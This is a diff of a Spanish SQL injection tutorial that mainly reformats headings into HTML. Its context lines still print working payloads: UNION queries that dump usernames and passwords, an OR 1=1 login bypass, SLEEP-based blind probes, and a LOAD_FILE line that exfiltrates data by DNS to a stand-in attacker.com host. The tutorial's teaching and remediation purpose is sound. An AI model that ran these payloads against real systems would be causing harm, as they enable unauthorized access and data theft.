@@ -27,7 +27,8 @@
   <span>Introducción a la Inyección SQL</span>
 </h2>
 
-#### 1.1 Fundamentos de SQL para Inyección
+
+<h3>1.1 Fundamentos de SQL para Inyección</h3>
 Antes de profundizar en las técnicas de inyección, es fundamental comprender ciertos bloques de construcción del lenguaje SQL que permiten manipular las consultas de forma avanzada.
 
 Los comentarios en SQL le indican a la base de datos que ignore todo el texto que aparece a continuación en la misma línea. En MySQL se utiliza el doble guión seguido de un espacio (`-- `) o el símbolo de almohadilla (`#`), mientras que los comentarios multilínea utilizan `/* */`. En un ataque, comentar el resto de la consulta es crucial para eliminar la sintaxis posterior que generaría un error de código.
@@ -40,9 +41,11 @@ Las funciones de cadenas facilitan la exfiltración masiva. La función `GROUP_C
 
 Por último, la base de datos `information_schema` es el catálogo de metadatos presente en motores como MySQL, MariaDB y PostgreSQL. Destacan dos tablas principales: `information_schema.tables` (que enumera todas las tablas de la base de datos) e `information_schema.columns` (que detalla los nombres de las columnas de cada tabla).
 
+<br>
+
+<h3>1.2 ¿Qué es la Inyección SQL?</h3>
 
 
-#### 1.2 ¿Qué es la Inyección SQL?
 La inyección SQL ocurre cuando una aplicación web toma la entrada proporcionada por el usuario y la concatena directamente dentro de una consulta SQL sin desinfectarla ni parametrizarla adecuadamente. Como resultado, el intérprete de la base de datos trata la entrada del usuario como código ejecutable en lugar de como datos planos.
 
 Las aplicaciones web dinámicas consultan la base de datos constantemente para construir el contenido visualizado. Si el código fuente backend construye una instrucción mediante concatenación directa de cadenas, cualquier carácter especial introducido en los parámetros cambiará la lógica del comando.
@@ -51,7 +54,10 @@ Existen tres categorías principales de inyección SQL según la forma en que el
 
 Para detectar vulnerabilidades SQLi, el método inicial consiste en inyectar caracteres de prueba como la comilla simple (`'`), la comilla doble (`"`), el comentario (`;--`) o condiciones lógicas (`OR 1=1`) en parámetros de URL, formularios de login, encabezados HTTP o cookies, observando si la aplicación devuelve errores internos o cambia su comportamiento.
 
-#### 1.3 Inyección SQL En Banda (In-Band)
+<br>
+
+<h3>1.3 Inyección SQL In Band</h3>
+
 La inyección en banda es el tipo más directo y sencillo de explotar porque el mismo canal utilizado para enviar el payload muestra los datos extraídos.
 
 #### Inyección Basada en Errores (Error-Based)
@@ -67,7 +73,9 @@ Utiliza el operador `UNION` para adjuntar una consulta `SELECT` secundaria. La m
 5. **Enumerar columnas:** Consultar las columnas de la tabla objetivo (`0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--`).
 6. **Extraer datos:** Extraer los registros deseados (`0 UNION SELECT 1,group_concat(username,':',password),3 FROM users--`).
 
-### 1.4 Inyección SQL Ciega: Anulación de Autenticación
+<br> 
+
+<h3> 1.4 Inyección SQL Ciega: Anulación de Autenticación </h3>
 En la inyección ciega, la aplicación web no muestra resultados de la consulta ni mensajes de error. El bypass de autenticación es el ejemplo más claro: la aplicación únicamente responde si el inicio de sesión fue exitoso o fallido.
 
 Las consultas de autenticación tradicionales verifican si existe un registro que coincida con el usuario y la contraseña proporcionados. Al inyectar una condición que siempre sea verdadera y comentar el resto de la consulta, la base de datos valida la solicitud sin conocer la clave.
@@ -82,7 +90,9 @@ SELECT * FROM users WHERE username='' OR 1=1;--' AND password='...';
 
 Al ser la condición `1=1` siempre verdadera y estar la verificación de contraseña comentada, la base de datos devuelve el primer registro de la tabla (habitualmente la cuenta de administrador), concediendo acceso inmediato.
 
-### 1.5 Inyección SQL Ciega: Basada en Booleanos y Tiempo
+<br>
+
+<h3> 1.5 Inyección SQL Ciega: Basada en Booleanos y Tiempo</h3>
 Cuando se requiere exfiltrar información de una base de datos sin salida visible, se utilizan técnicas ciegas basadas en preguntas de Sí/No.
 
 #### Inyección Ciega Basada en Booleanos
@@ -101,7 +111,9 @@ Se utiliza cuando la respuesta visual de la página es absolutamente idéntica a
 1' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
 ```
 
-### 1.6 Inyección SQL Fuera de Banda (Out-of-Band / OOB)
+<br>
+
+<h3>1.6 Inyección SQL Fuera de Banda (Out-of-Band / OOB)</h3>
 La inyección fuera de banda se utiliza cuando las técnicas en banda no son posibles y las respuestas ciegas resultan demasiado ruidosas o inestables por latencia de red. Requiere que el servidor de base de datos tenga permisos y capacidad para realizar conexiones salientes a Internet.
 
 En sistemas MySQL sobre Windows, se utiliza la función `LOAD_FILE()` especificando una ruta UNC hacia un servidor DNS o SMB controlado por el atacante. Al intentar resolver el recurso compartido, la base de datos realiza una consulta DNS incluyendo los datos robados dentro del subdominio.
@@ -113,7 +125,9 @@ SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\share'));
 
 En Microsoft SQL Server (MSSQL), se emplean procedimientos almacenados como `xp_dirtree` para forzar la búsqueda de directorios remotos y activar la resolución DNS, o `xp_cmdshell` (si está habilitado) para ejecutar comandos de sistema operativo como `nslookup` o `curl`.
 
-### 1.7 Remediación y Prevención
+<br>
+
+<h3>1.7 Remediación y Prevención</h3>
 La prevención efectiva de inyección SQL requiere aplicar defensas en profundidad, destacando la separación física del código y los datos.
 
 * **Consultas Preparadas (Sentencias Parametrizadas):** Es la solución definitiva. Se definen marcadores de posición (`?` o `%s`) en la estructura SQL y la base de datos trata los valores de entrada estrictamente como literales de datos, imposibilitando que alteren la lógica de la consulta.
